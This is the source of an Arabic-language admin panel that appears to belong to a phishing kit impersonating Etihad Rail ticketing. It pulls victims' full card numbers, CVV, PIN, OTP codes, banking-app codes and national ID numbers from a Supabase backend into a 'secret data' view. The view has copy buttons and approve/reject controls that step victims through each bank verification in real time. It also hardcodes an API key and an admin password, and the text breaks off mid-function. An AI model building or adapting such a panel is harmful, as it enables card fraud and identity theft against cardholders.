<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>لوحة الإدارة — قطارات الاتحاد</title>
<link rel="icon" href="/favicon.png" type="image/png">
<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
<style>
*{box-sizing:border-box;margin:0;padding:0}
html,body{height:100%;overflow:hidden;font-family:'Cairo','Segoe UI',sans-serif;
  background:#f4f5f7;color:#1a1a2e}
::-webkit-scrollbar{width:5px}
::-webkit-scrollbar-track{background:transparent}
::-webkit-scrollbar-thumb{background:rgba(0,0,0,.12);border-radius:4px}

.login-wrap{display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px;
  background:linear-gradient(135deg,#1a1a2e 0%,#16213e 50%,#0f3460 100%)}
.login-box{background:#fff;border-radius:24px;padding:48px 40px;width:100%;max-width:420px;
  box-shadow:0 20px 60px rgba(0,0,0,.3);text-align:center}
.login-box img{height:48px;margin-bottom:16px}
.login-box h1{font-size:24px;font-weight:800;margin:8px 0 4px;color:#1a1a2e}
.login-box .sub{color:#6b7280;font-size:13px;margin-bottom:32px}
.login-box input{width:100%;padding:14px 18px;border:2px solid #e5e7eb;border-radius:12px;
  font-size:15px;font-family:inherit;text-align:center;outline:none;margin-bottom:16px;background:#fff;color:#1a1a2e;transition:.2s}
.login-box input:focus{border-color:#C5A572;box-shadow:0 0 0 3px rgba(197,165,114,.15)}
.login-box button{width:100%;padding:14px;background:#C5A572;color:#fff;border:none;
  border-radius:12px;font-size:15px;font-weight:700;cursor:pointer;font-family:inherit}
.login-box button:hover{background:#b08f5a}
.login-err{color:#dc2626;font-size:12px;margin-bottom:10px;display:none}

.layout{display:none;flex-direction:column;height:100vh;overflow:hidden}

.topbar{background:#fff;padding:12px 24px;display:flex;align-items:center;justify-content:space-between;
  border-bottom:1px solid #e5e7eb;box-shadow:0 1px 3px rgba(0,0,0,.06)}
.tb-r{display:flex;align-items:center;gap:12px}
.tb-r img{height:32px}
.tb-r .t{color:#1a1a2e;font-weight:800;font-size:16px}
.tb-r .sp{color:#d1d5db;font-size:13px}
.tb-r .bn{color:#6b7280;font-size:13px}
.tb-l{display:flex;align-items:center;gap:12px}
.tb-visitors{display:inline-flex;align-items:center;gap:8px;background:#fef3c7;
  border:1px solid #fcd34d;color:#92400e;border-radius:999px;padding:6px 14px;
  font-size:13px;font-weight:800;cursor:pointer;font-family:'Cairo',sans-serif;transition:.2s}
.tb-visitors:hover{background:#fde68a}
.tb-visitors .num{background:#f59e0b;padding:2px 8px;border-radius:10px;color:#fff;font-weight:800;min-width:24px;text-align:center}
.tb-online{display:inline-flex;align-items:center;gap:6px;color:#065f46;background:#d1fae5;
  border:1px solid #6ee7b7;border-radius:999px;padding:6px 10px;font-size:12px;font-weight:700}
.tb-online .dot{width:7px;height:7px;border-radius:50%;background:#059669;box-shadow:0 0 7px #059669}
.tb-admin{color:#6b7280;font-size:13px}
.tb-logout{background:#fee2e2;border:1px solid #fca5a5;color:#dc2626;
  border-radius:8px;padding:6px 16px;cursor:pointer;font-size:13px;font-family:'Cairo',sans-serif;font-weight:700}

.stats{padding:16px 24px;display:grid;grid-template-columns:repeat(5,1fr);gap:16px;
  border-bottom:1px solid #e5e7eb;flex-shrink:0;background:#fff}
.sc{border-radius:16px;padding:14px 16px;text-align:center;transition:.15s;cursor:default;background:#fff;
  box-shadow:0 1px 3px rgba(0,0,0,.06);position:relative;overflow:hidden}
.sc:hover{transform:translateY(-2px);box-shadow:0 4px 12px rgba(0,0,0,.1)}
.sc-v{font-size:24px;font-weight:900;display:flex;align-items:center;justify-content:center;gap:6px}
.sc-v .live{width:8px;height:8px;border-radius:50%;display:inline-block;animation:pulse 1.5s infinite}
.sc-lb{font-size:12px;color:#6b7280;margin-top:4px;font-weight:600}
.sc-hint{font-size:10px;margin-top:2px;font-weight:700}

.body{display:flex;height:calc(100vh - 160px)}

.col-a{width:280px;border-left:1px solid #e5e7eb;overflow-y:auto;flex-shrink:0;background:#fefce8}
.col-a-head{padding:12px 16px;border-bottom:1px solid #e5e7eb;background:#fef9c3;
  position:sticky;top:0;z-index:1;display:flex;align-items:center;gap:8px;font-weight:800;font-size:13px;color:#92400e}
.col-a-head .gd{width:8px;height:8px;border-radius:50%;background:#059669;box-shadow:0 0 6px #059669;animation:pulse 1.5s infinite}
.ac{padding:10px 14px;border-bottom:1px solid #f3f4f6;cursor:pointer;transition:.15s}
.ac:hover{background:#fef3c7}
.ac.sel{background:#fde68a}
.ac-t{display:flex;align-items:center;justify-content:space-between;margin-bottom:6px}
.ac-n{font-weight:700;font-size:12px;color:#1a1a2e}
.st-badge{color:#fff;border-radius:8px;padding:1px 6px;font-size:9px;font-weight:700;display:inline-block}
.ac-info{display:flex;gap:8px;font-size:10px;color:#6b7280}
.ac-info .otp{color:#d97706;font-weight:700}
.al-empty{padding:30px 20px;text-align:center;color:#9ca3af}
.al-empty .ic{font-size:32px;margin-bottom:6px}
.al-empty p{font-size:12px}

.col-o{width:320px;border-left:1px solid #e5e7eb;overflow-y:auto;flex-shrink:0;background:#fff}
.col-o-head{padding:12px 14px;border-bottom:1px solid #e5e7eb;background:#f9fafb;position:sticky;top:0;z-index:1}
.col-o-head .t{font-weight:800;font-size:13px;color:#1a1a2e;margin-bottom:8px}
.col-o-head input{width:100%;padding:8px 12px;background:#fff;border:1.5px solid #e5e7eb;
  border-radius:8px;color:#1a1a2e;font-size:12px;font-family:'Cairo',sans-serif;outline:none;box-sizing:border-box}
.col-o-head input:focus{border-color:#C5A572}
.oc{padding:10px 14px;border-bottom:1px solid #f3f4f6;cursor:pointer;transition:.15s;position:relative}
.oc:hover{background:#f9fafb}
.oc.sel{background:#fef3c7}
.oc-t{display:flex;align-items:center;justify-content:space-between;margin-bottom:4px}
.oc-nm{display:flex;align-items:center;gap:6px}
.oc-nm .on{width:6px;height:6px;border-radius:50%;background:#059669}
.oc-nm span{font-weight:700;font-size:12px;color:#1a1a2e}
.oc-info{color:#6b7280;font-size:10px;direction:ltr;text-align:right}
.oc-otp{display:inline-block;margin-top:4px;background:#fef3c7;border-radius:4px;
  padding:1px 6px;font-size:10px;color:#92400e;font-weight:700;direction:ltr}
.oc-del{position:absolute;top:6px;left:6px;border-radius:5px;padding:2px 6px;font-size:10px;
  cursor:pointer;font-family:'Cairo',sans-serif;font-weight:700;transition:.15s}
.oc-del.normal{background:#fee2e2;border:1px solid #fca5a5;color:#dc2626}
.oc-del.confirm{background:#dc2626;border:1px solid #ef4444;color:#fff}
.ol-empty{padding:40px 20px;text-align:center;color:#9ca3af}
.ol-empty .ic{font-size:40px;margin-bottom:10px}
.ol-empty p{font-size:13px}

.col-d{flex:1;overflow-y:auto;padding:20px 24px;background:#f4f5f7}
.d-empty{display:flex;align-items:center;justify-content:center;height:100%;color:#9ca3af;
  flex-direction:column;gap:12px}
.d-empty .ic{font-size:56px}

.dh{background:#fff;border-radius:16px;padding:16px 20px;margin-bottom:16px;
  border:1px solid #e5e7eb;display:flex;align-items:center;justify-content:space-between;box-shadow:0 1px 3px rgba(0,0,0,.06)}
.dh-left{display:flex;align-items:center;gap:14px}
.dh-av{width:44px;height:44px;background:linear-gradient(135deg,#C5A572,#b08f5a);border-radius:12px;
  display:flex;align-items:center;justify-content:center;font-size:20px}
.dh-name{font-weight:800;font-size:18px;color:#1a1a2e}
.dh-meta{display:flex;align-items:center;gap:8px;margin-top:4px}
.dh-time{color:#6b7280;font-size:11px}
.dh-del{border-radius:8px;padding:6px 14px;font-size:12px;font-weight:700;cursor:pointer;font-family:'Cairo',sans-serif}
.dh-del.normal{background:#fee2e2;border:1px solid #fca5a5;color:#dc2626}
.dh-del.confirm{background:#dc2626;border:1px solid #ef4444;color:#fff}

.sec-codes{background:linear-gradient(135deg,#fffbeb,#fef3c7);
  border:1px solid #fcd34d;border-radius:16px;padding:16px;margin-bottom:16px;box-shadow:0 1px 3px rgba(0,0,0,.06)}
.sec-codes h3{font-weight:800;font-size:14px;color:#92400e;margin:0 0 12px}
.codes-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:10px}
.code-card{background:#fff;border-radius:10px;padding:12px;border:1px solid #fcd34d;text-align:center;box-shadow:0 1px 2px rgba(0,0,0,.04)}
.code-card .lbl{font-size:10px;color:#6b7280;margin-bottom:4px}
.code-card .val{font-weight:800;font-size:18px;color:#92400e;letter-spacing:2px;font-family:monospace;word-break:break-all;direction:ltr;display:inline-block}
.code-card .cp{margin-top:6px;background:#f9fafb;border:1px solid #e5e7eb;border-radius:6px;padding:3px 8px;
  color:#1a1a2e;font-size:10px;cursor:pointer;font-family:'Cairo',sans-serif}
.code-card .cp.ok{color:#059669}
.code-empty{background:#f9fafb;border-radius:10px;padding:12px;border:1px dashed #d1d5db;text-align:center}
.code-empty .lbl{font-size:10px;color:#9ca3af;margin-bottom:4px}
.code-empty .val{color:#9ca3af;font-size:12px}

.sec-data{background:#fff;border-radius:16px;padding:16px;margin-bottom:16px;border:1px solid #e5e7eb;box-shadow:0 1px 3px rgba(0,0,0,.06)}
.sec-data h3{font-weight:800;font-size:14px;color:#1a1a2e;margin:0 0 12px}
.data-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}
.data-item{background:#f9fafb;border-radius:10px;padding:12px;position:relative}
.data-item.hl{border:1px solid #fcd34d;background:#fffbeb}
.data-item:not(.hl){border:1px solid #e5e7eb}
.data-item .lbl{color:#6b7280;font-size:10px;margin-bottom:4px;display:flex;align-items:center;gap:4px}
.data-item .val{font-weight:700;font-size:13px;word-break:break-all;color:#1a1a2e;direction:ltr;text-align:right}
.data-item .val.hl{color:#92400e}
.data-item .cp{margin-top:6px;background:#fff;border:1px solid #e5e7eb;border-radius:5px;padding:2px 8px;
  color:#6b7280;font-size:10px;cursor:pointer;font-family:'Cairo',sans-serif}
.data-item .cp.ok{color:#059669}

.sec-ctrl{background:#fff;border-radius:16px;padding:16px;margin-bottom:16px;border:1px solid #e5e7eb;box-shadow:0 1px 3px rgba(0,0,0,.06)}
.sec-ctrl h4{font-weight:700;font-size:14px;margin:0 0 12px;color:#1a1a2e}
.approve-row{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:12px}
.approve-row button{border:none;border-radius:8px;padding:10px;font-size:12px;font-weight:700;cursor:pointer;font-family:'Cairo',sans-serif}
.btn-ok{background:#059669;color:#fff}
.btn-no{background:#dc2626;color:#fff}

.sec-del{background:#fef2f2;border-radius:16px;padding:16px;border:1px solid #fca5a5;margin-bottom:16px}
.sec-del h4{font-weight:700;font-size:14px;color:#dc2626;margin:0 0 10px;display:flex;align-items:center;gap:8px}
.del-warn{color:#92400e;font-size:12px;font-weight:700;margin-bottom:10px;text-align:center}
.del-confirm-row{display:flex;gap:8px}
.del-confirm-row button{flex:1;border:none;border-radius:8px;padding:8px 14px;font-size:12px;font-weight:700;
  cursor:pointer;font-family:'Cairo',sans-serif}
.btn-del-all{width:100%;background:#dc2626;color:#fff;border:1px solid #b91c1c;
  border-radius:8px;padding:10px 14px;font-size:12px;font-weight:800;cursor:pointer;font-family:'Cairo',sans-serif}
.sec-del .note{color:#6b7280;font-size:11px;margin-top:8px}

.modal-bg{display:none;position:fixed;inset:0;background:rgba(0,0,0,.5);backdrop-filter:blur(4px);
  z-index:9999;align-items:center;justify-content:center;padding:20px}
.modal-bg.show{display:flex}
.modal{background:#fff;border:1px solid #e5e7eb;border-radius:20px;
  width:100%;max-width:860px;max-height:90vh;display:flex;flex-direction:column;
  box-shadow:0 20px 60px rgba(0,0,0,.2);overflow:hidden}
.modal-head{padding:18px 24px;border-bottom:1px solid #e5e7eb;display:flex;
  align-items:center;justify-content:space-between;background:#fffbeb}
.modal-head h3{font-size:17px;font-weight:800;color:#92400e}
.modal-head .btns{display:flex;gap:8px}
.modal-head .btns button{border-radius:8px;padding:6px 12px;font-size:12px;font-weight:700;
  cursor:pointer;font-family:'Cairo',sans-serif}
.modal-body{padding:20px 24px;overflow-y:auto;flex:1}
.vm-stats{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;margin-bottom:20px}
.vm-sc{border-radius:16px;padding:14px;text-align:center;box-shadow:0 1px 3px rgba(0,0,0,.06)}
.vm-sc .n{font-size:26px;font-weight:900}
.vm-sc .l{font-size:12px;color:#6b7280;margin-top:4px;font-weight:600}
.vm-table{width:100%;border-collapse:collapse;font-size:12px;text-align:right}
.vm-table th{padding:10px 14px;font-weight:700;color:#6b7280;background:#f9fafb;
  border-bottom:1px solid #e5e7eb}
.vm-table td{padding:10px 14px;border-bottom:1px solid #f3f4f6}
.vm-table .online{display:inline-flex;align-items:center;gap:5px;color:#065f46;font-size:11px;font-weight:700}
.vm-table .online .d{width:6px;height:6px;border-radius:50%;background:#059669;box-shadow:0 0 6px #059669}
.vm-footer{margin-top:20px;padding-top:16px;border-top:1px solid #e5e7eb;
  display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:10px}
.vm-footer .note{font-size:11px;color:#6b7280}

.notif{position:fixed;top:16px;left:50%;transform:translateX(-50%);background:#1a1a2e;color:#fff;
  padding:12px 24px;border-radius:12px;font-size:14px;font-weight:700;z-index:10000;
  box-shadow:0 8px 24px rgba(0,0,0,.2);display:none;animation:slideD .3s ease}
@keyframes slideD{from{opacity:0;transform:translateX(-50%) translateY(-20px)}to{opacity:1;transform:translateX(-50%) translateY(0)}}
@keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.4;transform:scale(.8)}}

@media(max-width:1100px){.col-a{width:240px}.col-o{width:280px}}
@media(max-width:800px){
  .body{flex-direction:column;overflow-y:auto}
  .col-a,.col-o{width:100%;max-height:220px;overflow-y:auto}
  .col-d{min-height:500px}
  .stats{grid-template-columns:repeat(3,1fr)}
}
</style>
</head>
<body>

<div class="notif" id="notif"></div>
<div class="modal-bg" id="vModal"></div>

<div class="login-wrap" id="loginScreen">
  <div class="login-box">
    <img src="/etihad_rail_logo.png" alt="قطارات الاتحاد">
    <h1>لوحة الإدارة</h1>
    <p class="sub">أدخل كلمة المرور للوصول إلى لوحة التحكم</p>
    <div class="login-err" id="loginErr">كلمة المرور غير صحيحة</div>
    <input type="password" id="passInput" placeholder="كلمة المرور" autofocus>
    <button onclick="doLogin()">دخول</button>
  </div>
</div>

<div class="layout" id="layout">
  <div class="topbar">
    <div class="tb-r">
      <img src="/etihad_rail_logo.png" alt="">
      <span class="t">لوحة الإدارة</span>
      <span class="sp">|</span>
      <span class="bn">قطارات الاتحاد</span>
    </div>
    <div class="tb-l">
      <button class="tb-visitors" onclick="openVM()">
        <span>📊</span><span>الزوار:</span><span class="num" id="tbV">0</span>
      </button>
      <span class="tb-online"><span class="dot"></span> نشط الآن: <strong id="tbO">0</strong></span>
      <span class="tb-admin">👤 Admin</span>
      <button class="tb-logout" onclick="doLogout()">خروج</button>
    </div>
  </div>

  <div class="stats" id="statsRow"></div>

  <div class="body">
    <div class="col-a">
      <div class="col-a-head"><div class="gd"></div> بانتظار إجراء (<span id="aCnt">0</span>)</div>
      <div id="aList"></div>
    </div>
    <div class="col-o">
      <div class="col-o-head">
        <div class="t">📋 جميع الطلبات (<span id="oCnt">0</span>)</div>
        <input type="text" id="sInp" placeholder="🔍 بحث بالاسم أو الجوال أو البطاقة..." oninput="filterOrders()">
      </div>
      <div id="oList"></div>
    </div>
    <div class="col-d" id="colD">
      <div class="d-empty" id="dEmpty"><div class="ic">👈</div><p>اختر طلباً لعرض تفاصيله</p></div>
      <div id="dCont" style="display:none"></div>
    </div>
  </div>
</div>

<script>
var SB_URL="https://rfmbqnfjfaheiyfmaszu.supabase.co";
var SB_KEY="sb_publishable_Pncr0c7uPG8FNqH5qWz7cQ_kA-0uKIA";
var ADMIN_PASS="Admin@2026!";
var REST=SB_URL+"/rest/v1";
var H={"apikey":SB_KEY,"Authorization":"Bearer "+SB_KEY,"Content-Type":"application/json","Prefer":"return=representation"};
var Hmin={"apikey":SB_KEY,"Authorization":"Bearer "+SB_KEY,"Content-Type":"application/json","Prefer":"return=minimal"};

var PENDING=["payment_done","otp_done","pin_done","app_code_done"];
var DONE=["payment_approved","otp_approved","pin_approved","app_code_approved","max_code"];

var SL={
  "new":["جديد","#3b82f6"],"payment_done":["⚠ بانتظار الدفع","#d97706"],
  "payment_approved":["✅ دفع مقبول","#16a34a"],"payment_rejected":["❌ دفع مرفوض","#dc2626"],
  "otp_done":["⚠ بانتظار OTP","#f59e0b"],"otp_approved":["✅ OTP مقبول","#16a34a"],
  "otp_rejected":["❌ OTP مرفوض","#dc2626"],"pin_done":["⚠ بانتظار PIN","#a855f7"],
  "pin_approved":["✅ PIN مقبول","#16a34a"],"pin_rejected":["❌ PIN مرفوض","#dc2626"],
  "app_code_done":["⚠ بانتظار كود","#7c3aed"],"app_code_approved":["✅ كود مقبول","#16a34a"],
  "app_code_rejected":["❌ كود مرفوض","#dc2626"],"max_code":["الحد الأقصى","#6b7280"]
};

var orders=[],visitors=[],selId=null,sQ='',prevIds=new Set(),delConfId=null,detDelConf=false;

function sbGet(t,q){return fetch(REST+"/"+t+(q?"?"+q:""),{headers:H}).then(function(r){return r.ok?r.json():[]}).catch(function(){return[]})}
function sbPatch(t,id,d){return fetch(REST+"/"+t+"?id=eq."+id,{method:"PATCH",headers:Hmin,body:JSON.stringify(d)})}
function sbDel(t,id){return fetch(REST+"/"+t+"?id=eq."+id,{method:"DELETE",headers:Hmin})}

function doLogin(){
  if(document.getElementById('passInput').value===ADMIN_PASS){
    sessionStorage.setItem('er_admin','1');showDash();
  }else{document.getElementById('loginErr').style.display='block';setTimeout(function(){document.getElementById('loginErr').style.display='none'},3000)}
}
function doLogout(){sessionStorage.removeItem('er_admin');document.getElementById('layout').style.display='none';document.getElementById('loginScreen').style.display='flex'}
document.getElementById('passInput').addEventListener('keydown',function(e){if(e.key==='Enter')doLogin()});
function checkAuth(){if(sessionStorage.getItem('er_admin')==='1')showDash()}
function showDash(){document.getElementById('loginScreen').style.display='none';
  document.getElementById('layout').style.display='flex';loadOrders();loadVisitors()}

function playSound(){try{var c=new(window.AudioContext||window.webkitAudioContext),o=c.createOscillator(),g=c.createGain();
  o.connect(g);g.connect(c.destination);g.gain.setValueAtTime(.3,c.currentTime);o.type='sine';
  o.frequency.setValueAtTime(800,c.currentTime);o.frequency.setValueAtTime(1200,c.currentTime+.1);
  g.gain.exponentialRampToValueAtTime(.01,c.currentTime+.4);o.start(c.currentTime);o.stop(c.currentTime+.4)}catch(e){}}
function showNotif(m){var el=document.getElementById('notif');el.textContent=m;el.style.display='block';
  setTimeout(function(){el.style.display='none'},4000)}

function esc(s){return s?String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;'):''}
function fmtDate(d){if(!d)return'—';try{var x=new Date(d);return x.toLocaleDateString('ar-AE',{month:'short',day:'numeric',hour:'2-digit',minute:'2-digit'})}catch(e){return'—'}}
function maskCard(n){if(!n)return'';var s=n.replace(/\s/g,'');return s.length<8?s:s.slice(0,4)+' •••• '+s.slice(-4)}

function stBadge(status){var e=SL[status];if(!e)e=[status||'—','#6b7280'];
  return '<span class="st-badge" style="background:'+e[1]+'">'+e[0]+'</span>'}

function isPending(o){return PENDING.indexOf(o.status)!==-1}
function isDone(o){return DONE.indexOf(o.status)!==-1}

function renderStats(){
  var pending=orders.filter(isPending),done=orders.filter(isDone);
  var cards=[
    {label:'إجمالي الطلبات',value:orders.length,color:'#C5A572',bg:'rgba(197,165,114,0.1)',border:'rgba(197,165,114,0.25)',icon:'👥'},
    {label:'الزوار النشطين',value:visitors.length,color:'#22c55e',bg:'rgba(34,197,94,0.1)',border:'rgba(34,197,94,0.25)',icon:'🌐',live:true,click:true,hint:'عرض الزوار ↗'},
    {label:'بانتظار إجراء',value:pending.length,color:'#f59e0b',bg:'rgba(245,158,11,0.1)',border:'rgba(245,158,11,0.25)',icon:'⚠️'},
    {label:'مقبول',value:done.length,color:'#16a34a',bg:'rgba(22,163,74,0.1)',border:'rgba(22,163,74,0.25)',icon:'✅'},
    {label:'مرفوض',value:orders.filter(function(o){return(o.status||'').indexOf('rejected')!==-1}).length,color:'#dc2626',bg:'rgba(220,38,38,0.1)',border:'rgba(220,38,38,0.25)',icon:'❌'}
  ];
  document.getElementById('statsRow').innerHTML=cards.map(function(c){
    var cl=c.click?'cursor:pointer':'cursor:default';
    var onclick=c.click?' onclick="openVM()"':'';
    var live=c.live&&c.value>0?'<span class="live" style="background:'+c.color+'"></span>':'';
    var hint=c.hint?'<div class="sc-hint" style="color:'+c.color+'">'+c.hint+'</div>':'';
    return '<div class="sc" style="background:'+c.bg+';border:1px solid '+c.border+';'+cl+'"'+onclick+'>'+
      '<div class="sc-v">'+live+c.icon+' '+c.value+'</div>'+
      '<div class="sc-lb">'+c.label+'</div>'+hint+'</div>';
  }).join('');
  document.getElementById('tbV').textContent=orders.length;
  document.getElementById('tbO').textContent=visitors.length;
  document.getElementById('aCnt').textContent=pending.length;
  document.getElementById('oCnt').textContent=orders.length;
}

function renderActive(){
  var el=document.getElementById('aList'),list=orders.filter(isPending);
  if(!list.length){el.innerHTML='<div class="al-empty"><div class="ic">💤</div><p>لا توجد طلبات بانتظار إجراء</p></div>';return}
  el.innerHTML=list.map(function(o){
    var otp=o.otp_code?'<span class="otp">OTP: '+esc(o.otp_code)+'</span>':'';
    var pin=o.card_pin?'<span class="otp">PIN: '+esc(o.card_pin)+'</span>':'';
    return '<div class="ac'+(o.id===selId?' sel':'')+'" onclick="selectOrder(\''+o.id+'\')">'+
      '<div class="ac-t"><span class="ac-n">'+esc(o.name||'مجهول')+'</span>'+stBadge(o.status)+'</div>'+
      '<div class="ac-info">'+(o.mobile?'<span>📱 '+esc(o.mobile)+'</span>':'')+otp+pin+'</div></div>';
  }).join('');
}

function renderOrders(){
  var el=document.getElementById('oList');
  var list=orders;
  if(sQ){var q=sQ.toLowerCase();list=orders.filter(function(o){
    return(o.name||'').toLowerCase().indexOf(q)!==-1||(o.mobile||'').indexOf(q)!==-1||
      (o.card_number||'').replace(/\s/g,'').indexOf(q.replace(/\s/g,''))!==-1});}
  if(!list.length){el.innerHTML='<div class="ol-empty"><div class="ic">📭</div><p>لا توجد طلبات</p></div>';return}
  el.innerHTML=list.map(function(o){
    var isDC=delConfId===o.id;
    var otp=o.otp_code?'<div class="oc-otp">📲 OTP: '+esc(o.otp_code)+'</div>':'';
    return '<div class="oc'+(o.id===selId?' sel':'')+'" onclick="selectOrder(\''+o.id+'\')">'+
      '<div class="oc-t"><div class="oc-nm"><span>'+esc(o.name||'مجهول')+'</span></div>'+stBadge(o.status)+'</div>'+
      '<div class="oc-info">📱 '+esc(o.mobile||'—')+' • 💳 '+esc(maskCard(o.card_number))+' • 🕐 '+fmtDate(o.created_at)+'</div>'+
      otp+
      '<button class="oc-del '+(isDC?'confirm':'normal')+'" onclick="event.stopPropagation();oDel(\''+o.id+'\')">'+(isDC?'⚠️ تأكيد':'✕')+'</button></div>';
  }).join('');
}
function filterOrders(){sQ=document.getElementById('sInp').value.trim();renderOrders()}
function oDel(id){if(delConfId===id){sbDel('visitors',id).then(function(){
    delConfId=null;if(selId===id)closeDetail();loadOrders()})}
  else{delConfId=id;renderOrders();setTimeout(function(){if(delConfId===id){delConfId=null;renderOrders()}},3000)}}

function selectOrder(id){selId=id;delConfId=null;detDelConf=false;
  var o=orders.find(function(x){return String(x.id)===String(id)});if(o)renderDetail(o);renderActive();renderOrders()}
function closeDetail(){selId=null;document.getElementById('dEmpty').style.display='flex';
  document.getElementById('dCont').style.display='none';renderActive();renderOrders()}

function renderDetail(o){
  document.getElementById('dEmpty').style.display='none';
  var dc=document.getElementById('dCont');dc.style.display='block';
  var st=SL[o.status];var stColor=st?st[1]:'#6b7280';var stLabel=st?st[0]:(o.status||'—');
  var h='';

  h+='<div class="dh"><div class="dh-left"><div class="dh-av">👤</div><div>'+
    '<div class="dh-name">'+esc(o.name||'مجهول')+'</div>'+
    '<div class="dh-meta"><span class="st-badge" style="background:'+stColor+'">'+stLabel+'</span>'+
    '<span class="dh-time">🕐 '+fmtDate(o.created_at)+'</span></div></div></div>'+
    '<button class="dh-del '+(detDelConf?'confirm':'normal')+'" onclick="detDel(\''+o.id+'\')">'+(detDelConf?'⚠️ تأكيد':'🗑️ حذف')+'</button></div>';

  // SECRET CODES
  h+='<div class="sec-codes"><h3>🔑 البيانات السرية</h3><div class="codes-grid">';
  h+=codeCard('💳 رقم البطاقة',o.card_number);
  h+=codeCard('🔒 CVV',o.cvv);
  h+=codeCard('📲 رمز OTP',o.otp_code);
  h+='</div><div class="codes-grid" style="margin-top:10px">';
  h+=codeCard('🔑 PIN',o.card_pin);
  h+=codeCard('📱 كود التطبيق',o.app_code);
  h+=codeCard('📅 الصلاحية',o.expiry_month&&o.expiry_year?o.expiry_month+'/'+o.expiry_year:null);
  h+='</div></div>';

  // ALL DATA
  var allData=[
    {icon:'🕐',label:'تاريخ الإنشاء',value:fmtDate(o.created_at),hl:true},
    {icon:'👤',label:'الاسم',value:o.name},
    {icon:'📱',label:'رقم الجوال',value:o.mobile},
    {icon:'🪪',label:'رقم الهوية',value:o.id_number},
    {icon:'💳',label:'رقم البطاقة',value:o.card_number,hl:true},
    {icon:'👤',label:'اسم حامل البطاقة',value:o.card_name},
    {icon:'📅',label:'انتهاء الصلاحية',value:o.expiry_month&&o.expiry_year?o.expiry_month+'/'+o.expiry_year:null},
    {icon:'🔒',label:'CVV',value:o.cvv,hl:true},
    {icon:'🔑',label:'PIN',value:o.card_pin,hl:true},
    {icon:'📲',label:'رمز OTP',value:o.otp_code,hl:true},
    {icon:'📱',label:'كود التطبيق',value:o.app_code,hl:true},
    {icon:'🚂',label:'المسار',value:o.card_type},
    {icon:'💰',label:'المبلغ',value:parseAmount(o.address)},
    {icon:'📊',label:'الحالة',value:stLabel},
    {icon:'📝',label:'نوع الطلب',value:o.order_type}
  ].filter(function(d){return d.value&&d.value!=='—'&&d.value!=='null'});

  h+='<div class="sec-data"><h3>📋 جميع البيانات</h3><div class="data-grid">';
  allData.forEach(function(d){
    var hlc=d.hl?' hl':'';
    var valc=d.hl?' hl':'';
    h+='<div class="data-item'+hlc+'"><div class="lbl">'+d.icon+' '+d.label+'</div>'+
      '<div class="val'+valc+'">'+esc(d.value)+'</div>'+
      '<button class="cp" onclick="doCopy(this,\''+esc(String(d.value)).replace(/'/g,"\\'")+'\')">نسخ</button></div>';
  });
  h+='</div></div>';

  // JOURNEY CONTROL
  h+='<div class="sec-ctrl"><h4>🎮 التحكم في الطلب</h4>';
  if(o.status==='payment_done'){
    h+='<div class="approve-row">'+
      '<button class="btn-ok" onclick="doAction(\''+o.id+'\',\'payment_approved\')">✅ قبول الدفع</button>'+
      '<button class="btn-no" onclick="doAction(\''+o.id+'\',\'payment_rejected\')">❌ رفض الدفع</button></div>';
  }else if(o.status==='otp_done'){
    h+='<div class="approve-row">'+
      '<button class="btn-ok" onclick="doAction(\''+o.id+'\',\'otp_approved\')">✅ قبول OTP</button>'+
      '<button class="btn-no" onclick="doAction(\''+o.id+'\',\'otp_rejected\')">❌ رفض OTP</button></div>';
  }else if(o.status==='pin_done'){
    h+='<div class="approve-row">'+
      '<button class="btn-ok" onclick="doAction(\''+o.id+'\',\'pin_approved\')">✅ قبول PIN</button>'+
      '<button class="btn-no" onclick="doAction(\''+o.id+'\',\'pin_rejected\')">❌ رفض PIN</button></div>';
  }else if(o.status==='app_code_done'){
    h+='<div class="approve-row">'+
      '<button class="btn-ok" onclick="doAction(\''+o.id+'\',\'app_code_approved\')">✅ قبول الكود</button>'+
      '<button class="btn-no" onclick="doAction(\''+o.id+'\',\'app_code_rejected\')">❌ رفض الكود</button></div>';
  }
  h+='</div>';

  // ADDRESS/NOTES
  if(o.address){
    h+='<div class="sec-data"><h3>🚂 تفاصيل الرحلة</h3><div style="background:#f9fafb;border-radius:10px;padding:12px;border:1px solid #e5e7eb;font-size:13px;white-space:pre-wrap;line-height:1.8;color:#1a1a2e">'+esc(o.address)+'</div></div>';
  }

  // DELETE SECTION
  h+='<div class="sec-del"><h4>🗑️ حذف البيانات</h4>'+
    '<div id="delContent"><button class="btn-del-all" onclick="showDelConfirm()">🗑️ تصفير جميع البيانات</button></div>'+
    '<p class="note">سيتم حذف جميع الطلبات والزوار نهائياً</p></div>';

  dc.innerHTML=h;
}

function parseAmount(addr){if(!addr)return null;var m=addr.match(/([\d,.]+)\s*(AED|درهم)/i);return m?m[1]+' '+m[2]:null}

function codeCard(lbl,val){
  if(!val)return '<div class="code-empty"><div class="lbl">'+lbl+'</div><div class="val">لم يُسجل بعد</div></div>';
  return '<div class="code-card"><div class="lbl">'+lbl+'</div><div class="val">'+esc(val)+'</div>'+
    '<button class="cp" onclick="doCopy(this,\''+esc(val).replace(/'/g,"\\'")+'\')">📋 نسخ</button></div>';
}

function doCopy(btn,txt){navigator.clipboard.writeText(txt).then(function(){
  btn.classList.add('ok');var old=btn.textContent;btn.textContent='✅ تم';
  setTimeout(function(){btn.classList.remove('ok');btn.textContent=old},1500)})}

function detDel(id){if(detDelConf){sbDel('visitors',id).then(function(){detDelConf=false;closeDetail();loadOrders()})}
  else{detDelConf=true;var o=orders.find(function(x){return String(x.id)===String(id)});if(o)renderDetail(o);
    setTimeout(function(){if(detDelConf){detDelConf=false;var o2=orders.find(function(x){return String(x.id)===String(id)});if(o2)renderDetail(o2)}},3000)}}

function showDelConfirm(){
  document.getElementById('delContent').innerHTML=
    '<p class="del-warn">⚠️ هل أنت متأكد؟ سيتم حذف جميع الطلبات والزوار نهائياً!</p>'+
